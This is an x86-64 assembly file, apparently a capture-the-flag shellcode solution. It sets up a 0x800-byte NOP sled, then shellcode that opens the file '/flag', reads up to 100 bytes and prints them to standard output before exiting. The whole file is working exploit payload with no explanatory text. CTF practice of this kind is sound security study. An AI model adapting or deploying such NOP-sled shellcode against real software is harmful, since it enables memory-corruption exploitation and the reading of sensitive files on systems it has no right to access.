.intel_syntax noprefix
.globl _start

.section .text
_start:

    .rept   0x800
    .nop
    .endr 

    SHELL_CODE_BEGINNING:
        OPEN_FILE:
            xor rax, rax
            mov rax, 2
            lea rdi, [rip + flag_file]
            xor rsi, rsi
            syscall

        # Store the fd returned by open().
        mov rcx, rax

        READ_FILE:
            xor rax, rax
            mov rax, 0
            mov rdi, rcx
            lea rsi, [rip + flag]
            mov rdx, 100
            syscall

        # Store the number of bytes read
        mov rcx, rax

        WRITE_FILE:
            xor rax, rax
            mov rax, 1
            mov rdi, 1
            lea rsi, [rip + flag]
            mov rdx, rcx
            syscall

        EXIT:
            xor rax, rax
            mov rax, 60
            syscall

        flag_file: .string "/flag"

        flag: .skip 1024
